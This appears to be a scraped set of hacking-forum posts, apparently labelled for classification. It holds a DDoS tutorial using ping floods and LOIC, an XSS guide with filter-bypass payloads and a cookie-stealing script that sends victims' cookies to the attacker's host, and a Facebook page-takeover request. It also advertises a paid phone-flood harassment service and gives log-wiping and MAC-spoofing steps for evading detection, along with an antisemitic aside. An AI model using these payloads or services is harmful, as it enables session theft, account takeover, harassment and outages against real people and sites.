up and asks them \""run\"" or \""cancel\"" and 99.9% of people at this website have Java and 95% will say Yes. There you have your infections. Not getting many people visiting your rooms? I think it helps if you set a display picture go to google and find some nice real looking picture of a girl sucking cock or something and while your on  Hidden Content:  You must reply to see links  at the top were you found the Broadcast button click \""Edit\"" then click \""Edit Images\"" then upload your new image. 4. Garena Garena is a free multifunction game platform that allows gamers to interact, organize matches, and play their favorite games online with tens of millions of players. First download Garena client from HERE. After you download Garena install it, and open it. Youll need Garena account, you can create one in 30 seconds, if you need an account, PM me.

0	[TUT]DDoS Attack - A life lesson	"""   I DIDNT WRITE THIS.. Enjoy Introduction Recent events that have gone on in my favorite website(darksunlight.com) have inspired me to inform people of the dangers of DDoS. Like the art of hacking by \""Social Engineering\"", their is no anti-virus for DDoS. The only cure is knowledge. Informing the people is the only way to keep it from happening to them. Or a nice firewall^^ I know their are a lot more ways to DoS than are shown here, but ill let you figure them out yourself. If you find any mistake in this tutorial please tell me^^ What is \""DDoS\""? Denial of Service attacks(or Distributed Denial of Service attacks[DDoS]) are a form of organized attacks with the goal of taking down a server by overloading it. Often by sending useless information(packets) to a server in massive amounts. In-fact about a year ago I found one of my websites was accidentally DoS-ing darksunlight.com(I use darksunlight as my webhost) because my PHP script made an infinite loop that sent the same information over and over and over into darksunlights SQL databases. This one page took this EXTREMELY powerful server down twice in less than a minute. That site has since been deleted.  That story demonstrates that it does not take more than a simple \""error\"" in your code to overload a server. Keep in mind that altough spreading knowledge is my main goal, performing DDoS attacks is indeed a federal crime in the US.  It is also an international offence and will be punished according to the local laws of the individuals country. But enough talk. I will now show you a quick example of a DoS attack of sorts you can do on your local computer. Sample Keep in mind that this is NOT a real DoS attack, but rather an example to visualize how a DoS attack works. We will take down YOUR computer. Step 1 Open up notepad, mousepad, or your favored equivalent. Step 2 Type in this simple batch command Code: :a start goto a Step 3 Save as \""dossample.bat\"" making sure you select \""All files\"" from the \""File Type\"" dialog. Step 4 Run that sucker, but save your work first, as this will crash even the best computers in a matter of minutes. What did you learn from this? Observe how the file rapidly replicates itself, opening a new CMD right after it opens another. An infinite loop has been created that has filled the RAM with useless and massive amounts of CMDs(or Terminals for you Unix folk) DDoS attacks work much the same way, except instead of replicating an infinite number of CMDs, they send information(packets) to the server over and over and over again until the server crashes. What information you may ask? Anything. Your login name, your online status, a new comment, the number of views on a video, your new high score. Absolutely any information that could be resent a massive amount of times to the same server. Next we will be discussing the simplest form of DDoS. DDoS by Ping Flood Please note that I will be pinging my Localhost. You should too.  Perhaps one of the simplest ways to DoS is by using the ping command built into most operating systems, including all windows and Linux distributions. Step 1 Start up your server. Mine is apache, but that is beside the point, the server type does not matter. If it has an IP address, it can be pinged. Step 2 Type in the ping command Code: ping -t -a -l 65500 localhost Step 3 Press enter and watch it ping the localhost over and over until[/b] your server crashes, or you get tired of waiting for it to crash.  Since most modern servers can take the stress of the ping flood, you will need to get all your friends to help you ping to bring your server down. Or even slow it down. Command Explained ping - tells the computer to ping a server -t - It will continue to ping the server until the command is closed, or stopped. -a - Resolves the adress to host names. -l - Size. By default the ping will send 32bytes of data to the server, so you must change this to a bigger number. The maximum is 65,500bytes, so that is what we used. If you send a server any number higher than 65,500bytes it will instantly crash. This is called \""Ping of Death\"".  Like any other thing with the suffix \""of Death\"" it is very rare, and hard to accomplish indeed. In order to learn more about the Ping of Death, read my huge response to this very thread, here! DDoS by Reloading Something as simple as reloading a page can take down a server if done enough times. Step 1 Make a page that lets you submit forms. Method=GET is better than method=POST for this, but both will work. (If you do not understand step 1, just find a page that lets you submit information, like a new comment or upload a picture) Step 2 Fill out the forms and submit Step 3 Reload the page If the page uses the POST method your browser will display a dialog asking if you are sure you want to resend the information, or something to that effect. Simply click \""Continue\"" or \""OK\"".(see now why GET is better?) Step 4 Keep reloading until server is down. Their are many add ons and tools that allow you to auto-reload a page. It is a matter of googleing for them. They are widely available and free.  I have just created a program that allows you to Auto-refresh a page using IE. If you are interested please download from: Host: Darksunlight.com | Size: 9kb | Format: .zip ultra compressed | Platform: Windows This method is very primitive as you can see, but it is probably the best way to DDoS.  In order to learn more about DDoS by reload, read my huge response to this very thread, here! Low-Orbit Ion Cannon LOIC (Low Orbit Ion Cannon) is an app, written in C# and developed by praetox, that was used by Anonymous during Project Chanology. It attempts to DoS the target site by using all its bandwidth, sending TCP, UDP, or HTTP requests to the server until it crashes. Download: LOIC | Host: SourceForge | Size: 130kb Step 1 Download and extract LOIC Step 2 Open LOIC.exe and fill out the required information. [Image: 618px-low_orbit_ion_cannon.png] Instructions for filling out: IP or URL = IP or URL that you wish to DoS TCP / UDP message = information being sent, just write something random. Or leave it as default. Port = Servers port Method = Servers Method, leave as TCP if unknown If you are gonna try to take down a website then use HTTP Speed = set to \""<= faster\"" Threads = How many users it should simulate, the higher the number the faster it will crash. Set to 10,000. Note that this might make your computer lag, if so, set to a lower amount. Step 3 Click on \""IMMA CHARGIN MAH LAZER\"" This starts your the program. Warning: This tool might not seem like much, but many people of all ages have been arrested and convicted for knowingly using this tool. Remember DoS and DDoS are federal crimes, however insignificant it may seem. Use at your own discretion. Conclusion Now you know what a DDoS attack is and you can work to better protect your self. Their are still many other ways to attack a server, but these are the basics of DoS. Protect your servers xD Like any web developer I hope you will use this information for the good.  Sadly i know that their are those among us that are, even now as we read this, plotting how to do harm with this information.  To those, I flip the bird. """

0	[Tutorial] Cross-Site Scripting [XSS]	""" Hello and thanks for reading this tutorial on XSS, written by me. You may be asking as to why Im creating this tutorial. My inbox has lately been flooding, and Ive recieved a lot of requests on making this tutorial. Ive posted my XSS attacks on Google, Facebook, Defense.gov, and other huge sites. Ive even exploited HackForums security with XSS. What is XSS? XSS stands for Cross-Site-Scripting. It is basically an attack, that is used to execute HTML and Javascript on the web-page. This attack can be done by submitting queries into text-boxes, or even into the URL. The results come back reading the text as HTML, so it executes the scripts instead of displaying them in plain text. With an XSS attack, you can steal cookies from a Web-Administrator, or even use some social-engineering to manipulate someone into download a virus that youve created. Such as a Botnet, or RAT, maybe even a Keylogger. XSS can be very dangerous, but can also be very mild. Most of my attacks are mild XSS attacks, that can be difficult to use against a website. There are many ways to use XSS to your advantage. I will name a few examples. You can use an alert box to advertise yourself, or alert the web-admin that youve discovered a security breach involving XSS. You can also setup a Cookie-Stealer/Logger. Anything you can do with HTML, can be used against a site with this attack. I will explain some of the most important terms associated with XSS. What is HTML and Javascript? HTML HTML is sort of like a programming language. The distinctions between a programming language, and HTML, are not too far apart. They are both languages, that are used to create attributes, and events. HTML is a markup language, which is used mostly to create websites. HTML stands for Hyper-Text Markup Language. You can use HTML to create forms, buttons, and other stuff that can be used in a webpage. I highly doubt you will ever encounter a website that does not contain even a slight amount of HTML.  Javascript Now, first, lets get one thing straight. There is a HUGE difference between JAVA and JAVASCRIPT. Java, is a language that ressembles to C++, it can be used in games, and applications. Javascript is sort of similar to HTML, but definitely different in many ways. Javascript isnt used NEARLY as much in Webpages than HTML is. Javascript is used, more in applications outside of webpages. Like PDFs. Javascript can be an incredibly useful language along with HTML. They are both fairly simple to learn, and are very dynamic. XSS: My first attack . Now, lets start getting into the really good stuff. In this section, Ill be explaining how to use XSS to your advantage. We will also be launching our very first attack with XSS, if you know the basics to XSS, you can skip this section, because I doubt you will learn anything that you dont briefly know yet.  Now, our first step, is obviously to find a vulnerable site. Finding a site vulnerable to XSS is a lot easier than finding a site vulnerable to SQLi. The problem is, it can take time to determine whether the site is really vulnerable. With SQLi, you can just add a little . But in XSS, you must submit (sometimes) multiple queries, to test your site for XSS.  Most vulnerable sites will contain a Search, Login, or a Register area. Pretty much anywhere that contains a text-box, can be exploited with XSS. HOWEVER, many people forget this fact, and never use it to their full potential because they think its useless. You can exploit XSS through the source aswell. You cant just take any script, and edit the full thing. But editing an \""onmouseover\"" script, is definitely an exception. I will be explaining this method of XSS later on, for now, we need the complete basics.  Anyways, our site should have some Text-Boxes to input some HTML in. I will simply be using a search bar. So, lets try putting in the most known, BASIC query of all time. Code: Code: <script>alert(\""XSS\"")</script> That little script, is HTML. It will make a little message pop up, saying \""XSS\"". You can edit that part if you like. Just dont edit any other parts of the script. Put that into your search bar, and hit enter. Now, if a little alert box popped up, youve successfully attacked a site vulnerable to XSS! If no box popped up, that is alright, because that means the site has taken some time to put in a filter. A filter, is when we search something, then it goes through a mini process, basically an inspection. It checks for any malicious (dangerous) things. In this case, it will look for XSS. Sometimes, these filters are very weak, and can be by-passed very easily, other times, they can be quite difficult to bypass. There are a lot of ways to bypass an XSS filter. First, we have to find out what the filter is blocking. A lot of the time, it is blockin the alert. Heres an example of this kind of filter: Code: Code: <script>alert(\""XSS\"")</script> > Code: Code: <script>alert( > XSS DETECTED < )</script> It will block the quotes. So how the hell do we get passed that? Well, thankfully theres a way to encrypt the full message :). We will be using a little function called \""String.FromCharCode\"". The name of it pretty much explains it all. It encrypts our text, into ASCII. An example of this encryption, would be like this: Code: Code: String.fromCharCode(88,83,83) Yes, it can be a little bit confusing, but with a little bit of explaining, and testing, it is quite simple. Here is what our full query will look like: Code: Code: <script>alert(String.fromCharCode(88,83,83))</script> You do NOT need ANY quotes in the simple query like that. So lets put that back in the search bar, and voila! It worked! We got an alert box saying \""XSS\""! If you still didnt get any alert box, try some of these queries that I like to use: Code: Code: \""><script>alert(\""XSS\"")</script> \""><script>alert(String.fromCharCode(88,83,83))</script> ><script>alert(\""XSS\"")</script> ><script>alert(String.fromCharCode(88,83,83))</script> <ScRIPt>aLeRT(\""XSS\"")</ScRIPt> <ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt> \""><ScRIPt>aLeRT(\""XSS\"")</ScRIPt> \""><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt> ><ScRIPt>aLeRT(\""XSS\"")</ScRIPt> ><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt> </script><script>alert(\""XSS\"")</script> </script><script>alert(String.fromCharCode(88,83,83))</script> \""/><script>alert(\""XSS\"")</script> \""/><script>alert(String.fromCharCode(88,83,83))</script> /><script>alert(\""XSS\"")</script> /><script>alert(String.fromCharCode(88,83,83))</script> </SCRIPT>\""><SCRIPT>alert(\""XSS\"")</SCRIPT> </SCRIPT>\""><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>\"">\""><SCRIPT>alert(\""XSS\"")</SCRIPT> </SCRIPT>\"">><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> \"";alert(\""XSS\"");\"" \"";alert(String.fromCharCode(88,83,83));\"" ;alert(\""XSS\""); ;alert(String.fromCharCode(88,83,83)); \"";alert(\""XSS\"") \"";alert(String.fromCharCode(88,83,83)) ;alert(\""XSS\"") ;alert(String.fromCharCode(88,83,83)) Yes, I just wrote all those down, and it took longer than it shouldve, but they all work in their own way, so try as many of them as you can. Ive attacked some pretty huge sites with some of those queries. I create my own queries sometimes, you should create some too, they can come in handy a lot. XSS: Advanced Methods Now, in this section I will be sharing some ways to use XSS maliciously against a site. Now, keep in mind all malicious attacks sent over to a system, site, or server, is illegal and you CAN be prosecuted for these actions. So ALWAYS use protection if youre planning on doing something malicious to the site. If you want to make a little alert box pop up, you shouldnt need a Proxy/VPN. Cookie Stealing/Logging Now, cookie stealing is about the most malicious thing we can do with Non-Persistent XSS. A cookie stealer/logger, will log the cookies of the user who access the page to a certain document. The easiest way to do this, would be with a three step process. First, you should setup a site. Personally, I find  Hidden Content:  You must reply to see links  the best for upload malicious code, programs, or anything else. So go ahead and register there. Now, once youve created your site, go to the file manager. Create a new file. Call it \""CookieLog.txt\"". Leave the code blank. Now, create another file after that, called \""CookieLogger.php\"". In CookieLogger.php, we need to add some code, so that it sends the cookies that we log, into our Cookie Log.

To do this, we should probably Tiny the URL. Or if you can figure out how to Spoof the URL, that will work too. To Tiny the URL, go to  Hidden Content:  You must reply to see links  and just put in the URL. But hold one, we need to add a script into our XSS vulnerability. This is the script that will start our Cookie Logging. Code: <script>document.location=\""http://www.host.com/mysite/CookieLogger.php?cookie=\"" + document.cookie;</script> So just add that script after the URL, then tiny it, and send it to our Web-Admin, now this can take some time for the Admin to actually click it. Sometimes, the Admin wont click it, so if it takes too long, you should just give up and find another way to exploit it.  Once you get the cookie, you can use \""Cookie Manager\"" Firefox addon to manipulate and edit the cookies so that you can hijack the administrators session. I find Cookie Manager a very useful app for XSS, make sure to download it. Defacing Defacing is one of the most common things people like to do when they have access to multiple administrator options. Mostly so that they can advertise themselves, and simply let the administrator know that their security has been breached. Anyways, defacing with XSS requires persistent XSS, maybe a comment box, or something. You can use this script to create a re-direct to your deface page (You should probably redirect it to your deface on Pastehtml.com, because its anonymous uploading.) Code: Code: <script>window.location=\""http://www.pastehtml.com/YOURDEFACEHERE/\"";</script> ]XSS: Onmouseover Onmousover isnt a very exploitable vulnerability. But yet, it is still considered XSS. An onmouseover vulnerability would look something like this: Code: Code: onmouseover=prompt1337 We can exploit this, by editing it to: Code: Code: onmouseover=alert(\""XSS\"") Very basic vulnerability, but its getting more noticed, and patched in a lot more websites. Most sites will use Adobe Flash or CSS to do those kind of effects now.  XSS Filter Bypassing Techniques Sometimes a simple XSS query just wont do the trick. The reason your query isnt working, is because the website has a WAF or Filter set in place. A filter will block as many XSS and SQLi queries as possible. In this case, were dealing with XSS. There are many ways on bypassing XSS filters, but I will only explain a few. Hex Bypassing With blocked characters like >, <, and /, it is quite difficult to execute an XSS query. Not to worry, theres always a solution :) You can change your characters, into Hex. A Hex of a certain character, is basically the character, but in a different format. These should help you out: > = %3c  < = %3c  / = %2f ASCII Bypassing With an ASCII encryption, we can use the character \"". Which is blocked quite a bit. This is one of the most common XSS Filter bypasses of all time. A script that you would need to encrypt, would look like this: NOT WORKING SCRIPT Code: Code: <script>alert(\""XSS\"")</script> WORKING SCRIPT Code: Code: <script>alert(String.fromCharCode(88,83,83))</script> To encrypt your little part of a script, go to this site:  Hidden Content:  You must reply to see links  I use that site, and find it quite useful. Case-Sensitive Bypassing This kind of bypass rarely works, but its always worth a shot. Some filters are set in place to detect certain strings, however, the filters strings that are blocked are CASE SENSITIVE. So all we need to do, is execute a script, with different sizes of characters. This bypass, would look like this: Code: <ScRiPt>aLeRt(\""XSS\"")</ScRiPt> You can also mix that with ASCII encryption if you like. This kind of bypass only works on really stupid filters, or really REALLY old ones.  Some XSS Dorks Its usually best to create/find your own dorks, but in this tutorial, Ill write some up real quick to share: Code: inurl:search.php? inurl:find.php? inurl:search.html inurl:find.html inurl:search.aspx inurl:find.aspx Those dorks are about as basic as they can get, sorry if they do not satisfy you. I rarely use dorks, and with this tutorial you shouldnt need to use dorks to find a vulnerable site. XSS is a very popular vulnerability. Even in google I found some. Some in HackForums too. XSS isnt a very high-priority, at least not Non-Persistent. [Had to remove the Epilogue. This thread was too long D:] Just say thanks, and I hope you learned something :)   """
0	Hacking Facebook Pages 2015	"""   Hidden Content:  You must reply to see links A security vulnerability in Facebook business manager endpoint allows a third party application to hack any Facebook page with limited permissions and the victim will permanently lose admin access to the page. By default Facebook application interface do not allow third party applications to add or modify page admin roles (page roles like manager, editor, analyst etc..). Third party applications are allowed to perform all the operations like post statuses on your behalf, publish photos, etc.. except adding admin roles because if an application is allowed to add or remove admins then it could add some user as admin to the page and remove the actual owner permanently. In the other hand there is an endpoint for business pages called userpermissions which allows to add or remove page admin roles who are already handling the Facebook business. Following request would make target user as admin of the page. Request :- POST /<page_id>/userpermissions HTTP/1.1 Host :  graph.facebook.com  Content-Length: 245 role=MANAGER&user=<target_user_id>&business=<associated_business_id>&access_token=<application_access_token> Response :- true After some minutes of testing i got to know that removing the business parameter  from the request  didnt throw any error and allow us to  add anyone as new page admin and  delete the actual page  admin  on non business page where the application has manage_pages permission.  Thats it! Whatever the application may be, if it is having manage_pages permission of the admin then it could hack all of your Facebook pages in fraction of seconds.  Final Proof of Concept :-  If you are unable to understand then please watch this video.

1	Powerful phone attack from Flood Club	"""   Welcome to the participants of the platform! We offer the service  \""telephone flood\""  also known as  \""attack phone calls\""  from Flood Club.  We work with “black lists”, voice menu and multi-line phones. Free five-minute test drive to your phone. ---------------------------------------------------------------------------------------------------------- PRICES: Mobile and fixed numbers of CIS: 1 stream for 24 h. =  10$; each next stream + 8$; Bonuses for orders with more than 72 h. 1 stream with retention, compliance with the IVR terms or playing record = by agreement $/h. Mobile and fixed numbers of EU: 1 stream for 24 h. = 16 €; each next stream + 10 €; 1 stream with retention, compliance with the IVR terms or playing record = 9€ /h; Nice bonuses for long-term orders. Mobile and fixed numbers of USA: 1 stream for 24 h. = 20 $; each next stream + 15 $; 1 stream with retention, compliance with the IVR terms or playing record = 13$ /h; Other numbers:  By arrangement, in the presence of routes for particular regions. ---------------------------------------------------------------------------------------------------------- Please read the answers to frequently asked questions (FAQ): -What is the “stream”, what their quantity does affect and how to choose the required number? The number of streams is a quantity of lines (canals) using for the simultaneous dial to subscriber. By using one line a new call to subscriber could be initiated only after the end of the previous call. By using two or more lines simultaneous number of calls could be initiated, which is equal to the number of lines. It will reduce the gap between calls and/or make the attacked subscriber’s incoming line unavailable for calls.  The quantity of used lines depends on customer’s aims: for “annoying calls” using one line is enough. If the aim is to make a subscriber unavailable for all calls it’s need to select the number of treams to meet or exceed the number of subscriber’s incoming lines. The majority of mobile numbers have two incoming lines, so, to achieve an effect of “busy” recommend to use two or more streams. -What does “auto login to line”, “voice mail”, “flood with retention” mean? Auto login to line, voice mail mean any action on the side of attacked subscriber, which leads to the beginning of tariffing after the connection. In that case simple flood with retention after the rising a handset will not lead to expected result, in such cases we use flood with retention on the line with the implementation of necessary actions (for example, pressing the key “3”). -Is there the gap between calls while using one stream? After the end of the previous connection time of setting a new connection depends on such factors as type of the subscriber (mobile/fixed), load on the operator’s network of the subscriber in the current time, the routes using by the operator for the current call etc. According to our observations, the average interval between call can vary from 3 to 15 seconds. The gap reduces by one third with each additional stream. -Do you have all calls from one number or different numbers?  We have an opportunity to set number to display while the incoming call, and believe that it’s not in our interests to specify it in one instance ;) By default for orders in Russia we use the followimg numbers to show, where * = random digit: 79*********  By default for orders in Ukraine we use the following masks:  380*********  By default for orders in Belarus we use the following masks:  375*********  -We have masks for all countrys By the customer’s request there will be set any masks that conform to E.164-standart. Installation of specific numbers is possible; they will be displayed among the rest. -A subscriber has the redirect according to the signal “busy”, what to do? In this case, we recommend to increase the amount of stream for this number. While setting the redirect according to the signal “busy” calls will be redirected on subscriber’s mentioned number, including flood calls (when using two or more streams), but the effectiveness of flood will be slightly decreased, because subscriber has 1-2 new additional streams. In normal mode the attacked subscriber couldn’t use the phone, but the incoming call can be accepted with luck and subscriber’s persistence.

0	The Art of Anonymity	"""   The Art of Anonymity All credit goes to Lucid from Evilzone.org for this extensive info // None of that \""I collaborated a bunch of sources I found online!\"" shit. // This tutorial for educational purposes only  ::In This Tutorial - Browser Security - Local Net Security - Encryption/Logs - Virtualization Software/liveUSB - IP Address ::What You Will Need - A brain - A computer - The ability to read - Wireshark (not absolutely necessary) - Linux. Theres already plenty of Windows tutorials out there. - No Jews Allowed... - Ok fine Jews ::Lets Get Started! First of all, I realize that there are already a few anonymity tutorials in our wonderful Anonymity section. However, I realized today that they are incredibly generic and are practically duplicates of the hundreds of other generic tutorials out there littering the net. So, I decided to write one that is a little bit more inclusive. I would also like to add that there is not one tutorial out there that will provide you with absolutely all the information you will need to be 100% anonymous. In fact, I dont think that you even can be 100% anonymous. Keep that in mind, and always be paranoid. ::Browser Security Chaining 35 proxies wont do you any good if you overlook other aspects of being anonymous. As far as Im concerned theres a few keys points to browser security. User Agent: If you dont already know what this is then you should probably come back to this tutorial later in life. But just in case: \""The term was coined in the early days of the Internet when users needed tool to help navigate the Internet.  Back then, the Internet was (an actually still is) completely text-based, and to navigate the text, text commands needed to be typed into a keyboard.  Soon tools were developed to be the users agent, acting on the users behalf so that the user didnt have to understand the cryptic commands in order to retrieve information.  Today, nearly everyone uses a web browser as their user agent.\"" -  http://whatsmyuseragent.com/WhatsAUserAgent Obviously this can be indentifying, specially if you have a rather unique one. In older versions of Firefox you were able to go into the about:config and permanently edit your user agent. I dont think you can do that now. So instead, I would recommend getting an add-on to take care of this. There are plenty of them, but my favorite one is Override User Agent because it seems to have the most choices. Everything from Safari to Opera to Internet Explorer to Mozilla to Mobile user agents. Shit, you can even make it appear as though you are a Google Bot. Too easy. You can do this in most major browsers and it will almost always come in the form of an add-on. Something that was brought to my attention by proxx is that a network admin could potentially discover that you are being dishonest about your user agent via the TTL values of the packets. TTL stands for Time to Live and is responsible for limiting the number of hops of a packet. This prevents the packets from floating around for eternity to explain it in a mundane way. So, an example would be that you are using a Windows user agent and spoofed it to be a Linux user agent. It would be possible for the net admin to analyze the TTL value and determine that it was changed and when. A link provided by proxx might help to explain some of this:  http://www.binbert.com/blog/2009/12/defa...tl-values/ It would be a safe bet to keep your windows user agents windows, and your linux user agents linux. You can easily spoof the TTL values in linux, perhaps using iptables. Referer Url: This one seems to be rather overlooked. This is an HTTP header field that can be used to track your path from page to page. This one is also a simple fix. At least in Firefox. All you have to do is, once again, go to the about:config and search for network.http.sendRefererHeader. Once youve found it just set it to a value of 0. That takes care of that. You can also use the add on RefControl. In Chrome you can check this out: https://chrome.google.com/webstore/detai...ciin?hl=en If you are using Internet Explorer then..... Well then you should just go away. Cookies: Cookies are used to track your web activities. Dont think that just because you are using Tor you are safe from this. As usual there is a plethora of add-ons that you can use. You can also set your browser to not accept cookies from sites, however, you may find that you wont be able to access certain sites if you do this. At least make sure that you remove cookies when you are done with you session. This can be done in Firefox > Prefs > Privacy > Show Cookies >  Remove All Cookies. Obviously thats for firefox. In Chrome I think its something like, Chrome > Tools > Clear Browsing Data. For Opera it would be Settings > Preferences > Advanced > Cookies. For those of you who dont know there is such a thing as long-term cookies. Otherwise known as LSOs(Local Shared Objects). These are flash cookies. As far as I know they arent removed when you do the cookie removing steps I mentioned above. You can handle these by getting the add-on called BetterPrivacy. I hope I dont have to tell you guys to clear your history or use Private Browsing. Oh! and one more note that Im not going to make a title for. Be aware of the Desktop and Web Browser extensions you are using. For example, weather monitoring extensions could be very bad because they may transmit zip codes or address information to get local weather reports. Many people overlook this. Hiding your IP wont matter if you overlook this. Other good add-ons: Adblock Plus - Can be used for Firefox, Chrome, Opera and Android HTTPS Everywhere - Encrypts your communications with over 1000 websites. Unless youre taters Im sure most of you are already using this. Ghostery - See whats tracking you on a site to site basis. Block them if you wish TrackMeNot - I really like this one. This one spoofs your searches. For example, currently it looks like Im browsing for: dogs When instead I might be browsing: How to be a terrorist No Script - Oh come on. Startpage: Also, for those of you who dont like Google for obvious reasons, check out Startpage. It sends your searches to their own server before actually sending it out to the web to help hide whos searching. Its alot like Ixquick except that it yields better results. They dont log your IP. ::Local Net Security If you arent worried about your local network identifying your machine then I wouldnt worry about this section. Still, its good to know. MAC Address: Your MAC address is a 48bit hardware identifying address which is part of your network card. Everyone has one and they are all unique. Again, this doesnt cross router boundaries so there are many situations when spoofing this doesnt matter. There are a few ways to spoof this. This first way being manually. The basic syntax for this is: ip link set wlan0 down < to bring down the interface temporarily, otherwise it wont work ip link set wlan0 hw ether ff:ff:ff:ff:ff:ff < dont use that one idiot Snayler reminded me that in Debian based systems you can run: ifconfig wlan0 down <to bring down the interface ifconfig wlan0 hw ether ff:ff:ff:ff:ff:ff Then you have to reconfigure the interface. Simply running ip link set wlan0 up(or ifconfig wlan0 up) wont work. The easier way is just to do this with macchanger. Code: macchanger --help Code: Usage: macchanger [options] device   -h,  --help                   Print this help   -V,  --version                Print version and exit   -s,  --show                   Print the MAC address and exit   -e,  --endding                Dont change the vendor bytes   -a,  --another                Set random vendor MAC of the same kind   -A                            Set random vendor MAC of any kind   -r,  --random                 Set fully random MAC   -l,  --list[=keyword]         Print known vendors   -m,  --mac=XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX Generally I prefer to do macchanger -r wlan0. Dont forget to run ip link set wlan0 down first. If you want to run this at startup you could write a little bash script and symlink it. Code: ln -s /etc/init.d/script.sh /etc/rcX.d/K10script.sh For those systemd users I created a tutorial not too long ago on exactly how to do this here. DHCP: Many people are aware of the MAC address and that spoofing it might be a good idea. Not everyone considers this though. You dhcp client will often transmit some information when requesting an IP address. Much of the time this only includes your hostname and MAC address(which you now know how to spoof). Unless your hostname is: [email protected] /* &lt;![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName(script),e=t.length;e--;)if(t[e].getAttribute(data-cfhash))return t[e]}();if(t&amp;&amp;(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute(data-cfemail)){for(e=,r=0x+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=%+(0+(0x+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]&gt; */ Then you should be fine. Unfortunately, at least in the case of dhcpcd for you Gentoo and Arch users, it transmits a hell of alot more. It will transmit your hostname, dhcpcd version, kernel, OS and architecture. This is known as your vendor class id. Which is obviously very identifying. This can be taken care of by editing your /etc/dhcpcd.conf file. So, for example instead of having your actual hostname and vendorclass id be transmitted you can change it to whatever you want. Now, heres where you might want Wireshark. Set your filter to bootp and send out a DHCP request. Take a look at this DHCP Request packet. Notice where its highlighted and it says Vendor Class ID. That is extremely identifying information. As you can see Im using Arch linux with Genuine Intel. You now know my exact kernel and dhcp version. Underneath you can see that my hostname is machine. However, when I append these lines to the bottom of /etc/dhcpcd.conf: Code: hostname imatransvestite vendorclassid isc-dhclient-V3.1.3:Linux-2.6.32-45-generic-ubuntu:x86 And now we send out another dhcp request. Take a look at my vendor class id and hostname now. Be aware there are alot of local services that may transmit your user and hostname. TCP ident lookups, FTP logins, perhaps telnet are examples. Generally its a good idea to not have a unique or identifying user and hostname. ::Encryption/Logs NOTE: This information up to the Paranoid Encryption category is largely taken from the Arch Wiki. However, it is not copy/paste. There are a few kinds of encryption. Stacked Encryption: This is a when an encrypted filesystem is stacked on top of an existing filesystem. This causes all files written to the encrypted folder to be done so \""on the fly\"" before being written to disk. - eCryptfs - EncFS Block Device Encryption: This, on the contrary, is written below the filesystem layer to make sure that everything written to a certain block device is encrypted. - dm-crypt + LUKS - Truecrypt Example Encryption Schemes: 1. Simple Data Encryption - Would include an encrypted folder in /home. Might be encrypted in EncFS or truecrypt. 2. Simple Data Encryption(external device) - Would include an entire external device encrypted with Truecrypt. 3. Partial System Encryption - Would include the home directories encrypted, perhaps with eCryptfs. SWAP and /tmp separate partitions encrypted with dm-crypt + LUKS. 4. System Encryption - If using Truecrypt you cant do this in Linux. 5. Paranoid System Encryption - A rather clever idea. The entire hard drive is encrypted with dm-crypt + LUKS, and the /boot partition is on a separate USB stick. You would have to be freshly installing to do this because I highly doubt that any of you set up your /boot partition to be on a separate USB stick. This way, you cant even boot the OS without the USB. Be sure that anything sensitive you may have you NEVER put in an unencrypted area. I recommend always having at least an encrypted folder, if not an entire device, on an external drive. That way it is entirely off of your computer. I you accidentally happen to save something in an unencrypted area, dont think that deleting it is good enough. Every *nix should have a built in shredding command. man shred Code: NAME        shred - overwrite a file to hide its contents, and optionally delete it SYNOPSIS        shred [OPTION]... FILE... DESCRIPTION        Overwrite  the specified FILE(s) repeatedly, in order to make it harder Usage: shred [OPTION]... FILE... Overwrite the specified FILE(s) repeatedly, in order to make it harder for even very expensive hardware probing to recover the data. Mandatory arguments to long options are mandatory for short options too.   -f, --force    change permissions to allow writing if necessary   -n, --iterations=N  overwrite N times instead of the default (3)       --random-source=FILE  get random bytes from FILE   -s, --size=N   shred this many bytes (suffixes like K, M, G accepted)   -u, --remove   truncate and remove file after overwriting   -v, --verbose  show progress   -x, --exact    do not round file sizes up to the next full block;                    this is the default for non-regular files   -z, --zero     add a final overwrite with zeros to hide shredding       --help     display this help and exit       --version  output version information and exit I would recommend at least using the u and z flags. If you want to shred the contents of an entire directory you can run this command: find -type f -execdir shred -uvz {} \\; Logs: Logs can let someone know what you have been doing on your system. Some common places for logs and temporary data in Linux are: /tmp /var/tmp /var/logs /home (hidden files and folders) I would be careful about what you go doing in these directories. Destroying certain files could do serious damage to your operating system. Something else I would watch out for is your swap partition. Data could be saved here if you happen to use swap. This data could be retrieved even though you may not be aware of it. If you have the RAM I would recommend not even making a swap partition. Alternatively, you could mount your RAM and swap as /tmpfs and they will be cleared at shutdown. You can easily do this in your /etc/fstab. Certain *nixes already have this as default. If you are thorough(paranoid) enough, you could always write a bash script to run in place of your shutdown command. I dont know how many of you use the terminal to shutdown but if you dont you could always edit whatever shutdown button you use to run your script. Heres an example script: Code: #! /bin/bash # Truncate all files in /var/log find /var/log -type f exec sh -c > \""{}\"" \\; # Clear any other log files you deem necessary cat /dev/null > ~/.cache/config/openbox/openbox.log cat /dev/null > blahblah.txt shutdown -h now Then you can set your script to an alias: Code: Then you can set your script to an alias: And add that to your ~/.bashrc. This way all you have to do is open a terminal and run shutdown and you clear all your logs before shutdown. Simple. ::Virtualization Software/liveUSB To be quite honest, I wouldnt worry TOO much about logs. A better idea is to just not do anything illegal on your main OS. There are alternatives. Virtualbox/VMware: A good idea is to install some anonymity based OS(or any OS for that matter) in a virtualization software of your choosing. Doing this keeps alot of sensitive information such as logs and whatnot off of your main OS. Think of it as keeping all your dirty underwear in one tiny basket. Im not going to teach you how to create a virtual machine here because, its fucking easy. What I will say is that if you are going to do this you should do it the right way. My recommendation is to follow these steps: 1. Encrypt an external device. Preferably not a USB. Youll probably need something with more room. 2. Before you create the virtual machine, plug in your external and unlock it(since you encrypted it). 3. Set the path of the virtual machine in your settings to the path of the encrypted device. Doing so will make it so that the only way to access your virtual machine is if the device is plugged in and unlocked. 4. For extra security use a couple of keyfiles. Use a few 